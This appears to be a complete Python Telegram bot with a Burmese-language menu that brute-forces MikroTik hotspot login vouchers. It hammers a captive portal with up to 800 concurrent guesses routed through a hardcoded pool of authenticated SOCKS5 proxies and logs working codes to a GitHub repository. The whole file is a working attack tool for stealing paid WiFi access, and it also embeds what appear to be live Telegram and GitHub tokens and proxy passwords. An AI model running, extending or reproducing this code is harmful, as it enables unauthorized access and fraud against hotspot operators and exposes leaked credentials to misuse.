#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==========================================================================
☠️ MIKROTIK VOUCHER HARVESTER BOT (STATIC PROXIES) ☠️
 Supreme Static Proxy Pool + GitHub Vault | Telegram Bot
--------------------------------------------------------------------------
 MIKROTIK PLATFORM SCANNER WITH MYANMAR INTERFACE & 24/7 STABILITY
==========================================================================
"""

import os
import sys
import re
import json
import base64
import random
import string
import time
import uuid
import asyncio
from datetime import datetime, timedelta, timezone

from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import aiohttp
from aiohttp_socks import ProxyConnector
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = '9064050432:AAF43JE_7JLO3rUSnxtQ8UkRJaNi3J9HT98'
GITHUB_TOKEN = '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'
ADMIN_ID = "8702460710"
REPO_OWNER = "repo"
REPO_NAME = "Lord_of_barkness"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
retry_counts = {}

session = None
_connector = None
CONCURRENCY = 800
_voucher_sem = None
_start_time = time.monotonic()

# ==============================================================================
#  STATIC PROXIES POOL (HARDCODED)
# ==============================================================================
PROXY_POOL = [
    "socks5://wGai8DyPSNeQlAd:8WaUgqvJvWAyqev@74.122.59.173:46755",
    "socks5://tzXeza38EipmXsG:wCBAzafvMmK8Ga1@45.45.197.176:43067",
    "socks5://5kIBW3bsPzzJ1lj:aJRPb2VJSRZAguM@205.196.9.184:45587",
    "socks5://rx5pJgxEHXd0o7x:uz24glKbgeUUImN@205.196.10.28:44219",
    "socks5://O6OAD3lumn3SgnM:Jxu2Pjh5dNCm5rt@205.196.8.80:46631",
    "socks5://IjmCt2FqgNmztJy:YsI0sZkXYck4MUX@205.196.9.107:47173",
    "socks5://PvXLEKn1kZVQJEp:jFtdLOBu9aKQHU9@205.196.8.196:46312",
    "socks5://D2AiNwOf6EFrXbB:IMgUdQgGAYDBLug@205.196.8.138:45734",
    "socks5://hnpI7ZMjgezqECv:ccOXiU2p2WrUxM1@205.196.8.171:42890",
    "socks5://O0cHRJA8rejuyEu:2nb8OXLrQ2YmZ4Y@198.143.13.145:45652",
    "socks5://8NTXIon7t1XoHvH:U6EzSoBJ1AA7K8V@74.122.56.209:44662",
    "socks5://u5dJ1AQnqvl6d0m:iI8sWqq113npBkq@205.196.9.189:48881",
    "socks5://0JNnXAruZUVbLWa:rlGpLEsoZq95kz7@205.196.11.212:48256",
    "socks5://nQ2EPjxw0aXDlw1:N2H6w5ZOxjIdcyT@205.196.8.33:47226",
    "socks5://g1EtCz12NSazZUN:ihktMqFAUIwmjLW@205.196.10.37:45610",
    "socks5://KmjSGD5Cu84yDke:2IBX5Q5iDOI7cQG@5.102.107.77:44792",
    "socks5://BajD8aFKbyV27V4:UbCDUeFAsBtDWWd@91.192.242.165:42355",
    "socks5://pfxS7n8VqHOXZz6:fwu0UcCxNwXvBlm@91.192.241.153:42838",
    "socks5://aWpmZG6KreyuaLa:BrsEdu51jdDLaQC@176.46.128.119:46182",
    "socks5://TRGTNayR3wgA9Xa:AFsOecsUEE6VXzR@203.166.138.243:44770",
    "socks5://hrTWLMPEBYFVrVW:9NEf7wIACJmzqwa@203.166.138.96:44864",
    "socks5://MnOiyGEqDUjArYR:zHqarIcDRmUmN3S@203.166.138.47:49826",
    "socks5://ZRtgFGWj9eck3fg:9L2DqsPsYziYWBC@92.113.90.10:43237",
    "socks5://NsehLJpU1IjEsoj:lFzK5KeIJYSLrCj@176.46.128.106:43682",
    "socks5://dxQ2u8jI93gSBYr:1jo8RdyC79HAmia@176.46.128.24:47379",
    "socks5://jarth7WMduhMDQJ:xLFY9Hmg2wH405b@203.166.138.213:46127",
    "socks5://Qhuk3p7bWfpkCzc:Vq16jyIYuvHp11B@203.166.138.221:44541",
    "socks5://ZoEnJJ7mqrTLjB1:JmqNCVlCQom0s0b@92.113.90.156:41366"
]

BAD_PROXIES = set()
PROXY_LOCK = asyncio.Lock()

async def get_next_proxy():
    async with PROXY_LOCK:
        if not PROXY_POOL:
            return None
        valid_proxies = [p for p in PROXY_POOL if p not in BAD_PROXIES]
        if not valid_proxies:
            BAD_PROXIES.clear()
            valid_proxies = PROXY_POOL
        return random.choice(valid_proxies)

async def mark_proxy_bad(proxy):
    async with PROXY_LOCK:
        if proxy:
            BAD_PROXIES.add(proxy)

# ==============================================================================
#  WEB SERVER FOR 24/7 UPTIME
# ==============================================================================
async def handle(request):
    return web.Response(text="⚔️ MIKROTIK MATRIX CORE ACTIVE 24/7 ⚔️")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==============================================================================
#  GITHUB STORAGE SYNC
# ==============================================================================
async def get_file_content(path):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except Exception:
        pass
    return {}, None

async def update_file_content(path, content, sha, message):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        payload = {"message": message, "content": encoded, "sha": sha}
        async with session.put(url, headers=headers, json=payload) as response:
            return await response.text()
    except Exception:
        return ""

# ==============================================================================
#  MYANMAR UI & INTERACTIVE KEYBOARDS
# ==============================================================================
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔑 ၁။ အတည်ပြုရန် (Key)", callback_data="menu_key"),
        InlineKeyboardButton("📥 ၂။ ဂျိတ်ဝေးလင့်ထည့်ရန် (Input)", callback_data="menu_input"),
        InlineKeyboardButton("⚡ ၃။ စကင်န်စတင်ရန် (Scan)", callback_data="menu_scan"),
        InlineKeyboardButton("🔄 ၄။ ဟစ်များကိုပြန်စစ်ရန် (Recheck)", callback_data="menu_recheck"),
        InlineKeyboardButton("📋 ၅။ သိမ်းဆည်းထားသောဟစ်များ (Result)", callback_data="menu_result"),
        InlineKeyboardButton("⏹ ၆။ ရပ်တန့်ရန် (Stop)", callback_data="menu_stop"),
        InlineKeyboardButton("📊 ၇။ အခြေအနေ (Status)", callback_data="menu_status"),
        InlineKeyboardButton("❓ ၈။ အသုံးပြုပုံလမ်းညွှန် (Help)", callback_data="menu_help")
    )
    return markup

def scan_mode_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🩸 06-DIGIT (နံပါတ် ၆ လုံး)", callback_data="scan_6"),
        InlineKeyboardButton("🩸 07-DIGIT (နံပါတ် ၇ လုံး)", callback_data="scan_7"),
        InlineKeyboardButton("🩸 08-DIGIT (နံပါတ် ၈ လုံး)", callback_data="scan_8"),
        InlineKeyboardButton("🦇 06-ASCII LOWER (အင်္ဂလိပ်သေး)", callback_data="scan_ascii"),
        InlineKeyboardButton("☠️ CYBER CHAOS (အင်္ဂလိပ်+နံပါတ်)", callback_data="scan_all"),
        InlineKeyboardButton("🔙 ပင်မမီနူးသို့ (Back)", callback_data="menu_back")
    )
    return markup

@bot.message_handler(commands=['start'])
async def start(message):
    welcome_text = (
        "╔═════════════════════════════════════╗\n"
        "║     ⚔️ MIKROTIK WIFI BOT ⚔️         ║\n"
        "╚═════════════════════════════════════╝\n\n"
        "မြန်မာဘာသာဖြင့် အလွယ်တကူ အသုံးပြုနိုင်သော MikroTik စနစ်။\n"
        "အောက်ပါ ခလုတ်များမှ တစ်ခုချင်း ရွေးချယ်အသုံးပြုပါ။"
    )
    await bot.reply_to(message, welcome_text, parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['menu'])
async def menu_command(message):
    await bot.reply_to(message, "📋 **ပင်မ ထိန်းချုပ်ရန် မီနူး**", parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if call.data == "menu_back":
        await bot.edit_message_text("📋 **ပင်မ ထိန်းချုပ်ရန် မီနူး**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_key":
        user_data[chat_id] = {}
        await bot.edit_message_text("✅ **အတည်ပြုပြီးပါပြီ!**\nယခု ဆက်လက်၍ `/input` ဖြင့် MikroTik လင့်ခ် ထည့်ပါ။", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_input":
        await bot.edit_message_text("📥 **MikroTik လင့်ခ် ထည့်သွင်းခြင်း**\n\nပုံစံ- `/input http://skk.wifi/login?dst=...` ဟု ရိုက်ထည့်ပါ။", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_scan":
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['platform'] = 'mikrotik'
        await bot.edit_message_text("📜 **MikroTik စကင်န်မုဒ်ကို ရွေးချယ်ပါ:**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=scan_mode_menu())
        await call.answer()
        return

    if call.data.startswith("scan_"):
        mode_map = {"scan_6": "6", "scan_7": "7", "scan_8": "8", "scan_ascii": "ascii-lower", "scan_all": "all"}
        mode = mode_map.get(call.data, "6")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['scan_mode'] = mode
        user_data[chat_id]['platform'] = 'mikrotik'
        
        await bot.edit_message_text(f"⚡ **စတင် စကင်န်ဖတ်နေပါပြီ...** Mode: `{mode}`", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        
        class FakeMessage:
            def __init__(self, cid):
                self.chat = type('obj', (object,), {'id': cid})()
        fake_msg = FakeMessage(chat_id)
        await scan(fake_msg, mode)
        await call.answer()
        return

    if call.data == "menu_recheck":
        await bot.edit_message_text("🔄 **သိမ်းဆည်းထားသော ဟစ်များကို ပြန်လည်စစ်ဆေးနေပါပြီ...**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await recheck(call.message)
        await call.answer()
        return

    if call.data == "menu_result":
        await bot.edit_message_text("📋 **ရရှိထားသော ဟစ်များကို ထုတ်ယူနေပါပြီ...**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await handle_result(call.message)
        await call.answer()
        return

    if call.data == "menu_stop":
        await bot.edit_message_text("⏹ **အလုပ်လုပ်နေမှုကို ရပ်တန့်လိုက်ပါပြီ။**", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await stop_scan(call.message)
        await call.answer()
        return

    if call.data == "menu_status":
        await status(call.message)
        await call.answer()
        return

    if call.data == "menu_help":
        help_text = (
            "📖 **မြန်မာဘာသာ အသုံးပြုပုံလမ်းညွှန်**\n\n"
            "၁။ `/key` - စနစ်ကို စတင်အသုံးပြုရန် ခွင့်ပြုချက်ရယူပါ။\n"
            "၂။ `/input <url>` - MikroTik လင့်ခ်ကို ထည့်ပါ။\n"
            "၃။ `/scan` - စကင်န်ဖတ်မည့် ပုံစံကို ရွေးချယ်ပါ။\n"
            "၄။ `/recheck` - ရထားသော ကုဒ်များ သက်တမ်းရှိမရှိ ပြန်စစ်ပါ။\n"
            "၅။ `/result` - အောင်မြင်ထားသော ကုဒ်များကို ကြည့်ပါ။\n"
            "၆။ `/stop` - လုပ်ဆောင်ချက်ကို ရပ်ရန်။"
        )
        await bot.edit_message_text(help_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await call.answer()
        return

# ==============================================================================
#  COMMAND HANDLERS
# ==============================================================================
@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_data[message.chat.id] = {}
    await bot.reply_to(message, "✅ **ခွင့်ပြုချက် အောင်မြင်ပါသည်!** ဆက်လက်၍ `/input` ဖြင့် MikroTik လင့်ခ်ထည့်ပါ။", parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"📋 **အောင်မြင်စွာ ရရှိထားသော ဟစ်များ:**\n\n{codes}", parse_mode="Markdown", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "🖤 ယခုထိ ရှာဖွေတွေ့ရှိထားသော ကုဒ် မရှိသေးပါ။", parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "❌ **အသုံးပြုပုံ:** `/input http://skk.wifi/login?dst=...`", parse_mode="Markdown", reply_markup=main_menu())
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "⏳ လင့်ခ်ချိတ်ဆက်မှုကို စစ်ဆေးနေပါပြီ...", parse_mode="Markdown")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "✅ **လင့်ခ်ချိတ်ဆက်မှု အောင်မြင်ပါသည်!** `/scan` ဖြင့် စကင်န်စတင်ပါ။", parse_mode="Markdown", reply_markup=main_menu())
        else:
            await bot.reply_to(message, "❌ **အမှား:** ထည့်သွင်းလိုက်သော လင့်ခ် မမှန်ကန်ပါ။", parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['scan'])
async def scan(message, mode=None):
    if mode is None:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "🌐 စကင်န်မုဒ်ကို ရွေးချယ်ပါ:", parse_mode="Markdown", reply_markup=scan_mode_menu())
            return
        mode = args[1]
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "⚠️ ကျေးဇူးပြု၍ `/key` နှင့် `/input` ကို အရင်လုပ်ဆောင်ပါ။", parse_mode="Markdown", reply_markup=main_menu())
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ စကင်န်ဖတ်နေဆဲ ဖြစ်ပါသည်။ ရပ်ရန် `/stop` ကိုသုံးပါ။", parse_mode="Markdown", reply_markup=main_menu())
        return

    progress_msg = await bot.send_message(chat_id, "🔮 စကင်န်ဖတ်ရန် အလုပ်သမားများကို စတင်နေပါပြီ...", parse_mode="Markdown", reply_markup=main_menu())
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    await bot.reply_to(message, f"📊 အလုပ်လုပ်နေသော စကင်န်အရေအတွက်: `{active_scans}` | Static Proxy ပမာဏ: `{len(PROXY_POOL)}`", parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        await bot.reply_to(message, "🛑 **စကင်န်ဖတ်ခြင်း ရပ်တန့်သွားပါပြီ။**", parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        return
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = results[chat_id_str]
        await bot.reply_to(message, "🔄 ဟစ်များကို အတည်ပြုစစ်ဆေးနေပါပြီ...", parse_mode="Markdown")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
            if recode:
                recheck_list.append(recode)
        await bot.reply_to(message, f"✅ **ပြန်လည်စစ်ဆေးချက် ရလဒ်:**\n\n" + ("\n".join(recheck_list) if recheck_list else "အားလုံး သက်တမ်းကုန်သွားပါပြီ။"), parse_mode="Markdown", reply_markup=main_menu())

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(60)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Sync hits")
            except Exception:
                pass

# ==============================================================================
#  CODE GENERATION ENGINE
# ==============================================================================
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"မမှန်ကန်သော ပုံစံ: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} c/m"
    if total is not None:
        bar_length = 15
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / (100 / bar_length)))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            "╔═════════════════════════════════════╗\n"
            "║    ⚔️ စကင်န်ဖတ်နေဆဲ (LIVE STATUS) ⚔️ ║\n"
            "╚═════════════════════════════════════╝\n"
            f"📦 စစ်ဆေးပြီး : `{checked:,}/{total:,}`\n"
            f"📊 ရာခိုင်နှုန်း : `{percent:.2f}%`\n"
            f"⚡ အမြန်နှုန်း : `{speed_str}`\n"
            f"✅ တွေ့ရှိချက် : `{found}`\n"
            f"🔁 ထပ်ကြိုးစား : `{retries}`\n"
            f"[{bar}]"
        )
    return (
        "╔═════════════════════════════════════╗\n"
        "║    ⚔️ စကင်န်ဖတ်နေဆဲ (LIVE STATUS) ⚔️ ║\n"
        "╚═════════════════════════════════════╝\n"
        f"📦 စစ်ဆေးပြီး : `{checked:,}`\n"
        f"⚡ အမြန်နှုန်း : `{speed_str}`\n"
        f"✅ တွေ့ရှိချက် : `{found}`\n"
        f"🔁 ထပ်ကြိုးစား : `{retries}`\n"
        "အခြေအနေ     : `အမြန်နှုန်းမြင့် စကင်န်ဖတ်နေသည်`"
    )

BATCH_SIZE = 1000

async def check_session_url(session_url):
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as resp:
            return True
    except Exception:
        return False

# ==============================================================================
#  MIKROTIK CHECKER ENGINE
# ==============================================================================
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    response = None

    for _attempt in range(2):
        proxy_url = await get_next_proxy()
        connector = None
        if proxy_url:
            try:
                connector = ProxyConnector.from_url(proxy_url, rdns=True) if proxy_url.startswith("socks") else ProxyConnector.from_url(proxy_url)
            except Exception:
                connector = None

        timeout = aiohttp.ClientTimeout(total=10)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as task_session:
                if "?" in session_url:
                    base_part, query_part = session_url.split("?", 1)
                    mt_url = f"{base_part.rstrip('/')}?username={code}&{query_part}"
                else:
                    mt_url = f"{session_url.rstrip('/')}?username={code}"

                headers = {"user-agent": "Mozilla/5.0"}
                async with task_session.get(mt_url, headers=headers, allow_redirects=True) as req:
                    response = await req.text()
        except Exception:
            if proxy_url:
                await mark_proxy_bad(proxy_url)
            continue
        finally:
            if connector:
                await connector.close()
        break

    if not response:
        return

    is_hit = False
    resp_lower = response.lower()
    if 'status' in resp_lower or 'logged in' in resp_lower or 'logout' in resp_lower or 'you are logged' in resp_lower:
        is_hit = True

    if is_hit:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append(f"🎫 `{code}` [MIKROTIK]")
        code_line = "\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"✅ **အောင်မြင်သော ဟစ်များ:**\n\n{code_line}", parse_mode="Markdown", reply_markup=main_menu())
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"✅ **အောင်မြင်သော ဟစ်များ:**\n\n{code_line}", parse_mode="Markdown", reply_markup=main_menu())
            except Exception:
                pass

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    last_update = 0
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            now = time.monotonic()
            if now - last_update >= 3:
                elapsed = now - scan_start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                found = len(success_texts.get(chat_id, []))
                retries = retry_counts.get(chat_id, 0)
                text = format_progress(checked, total, speed, found, retries)
                try:
                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="Markdown", reply_markup=main_menu())
                    last_update = now
                except Exception:
                    pass

        scan_tasks.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

async def start_polling():
    backoff = 5
    while True:
        try:
            print("[BotDaemon] 24/7 Infinity Polling စတင်နေပါပြီ...")
            await bot.infinity_polling(timeout=30, request_timeout=45, skip_pending=True)
        except Exception as e:
            print(f"[BotDaemon] ချိတ်ဆက်မှုပြတ်တောက်သွားသည်: {e}. {backoff} စက္ကန့်အတွင်း ပြန်ချိတ်ပါမည်...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=10000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20), connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        # ဖယ်ရှားပြီး - အွန်လိုင်းမှ Proxy ဆွဲယူသည့် proxy_refresher_daemon ကို အသုံးမပြုတော့ပါ
        await start_polling()
    except Exception as e:
        print(f"[MainDaemon] အမှားအယွင်း ဖြစ်ပေါ်သည်: {e}")
    finally:
        if session:
            await session.close()
        if _connector:
            await _connector.close()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[System] ဘော့တ်ကို အောင်မြင်စွာ ရပ်တန့်လိုက်ပါပြီ။")
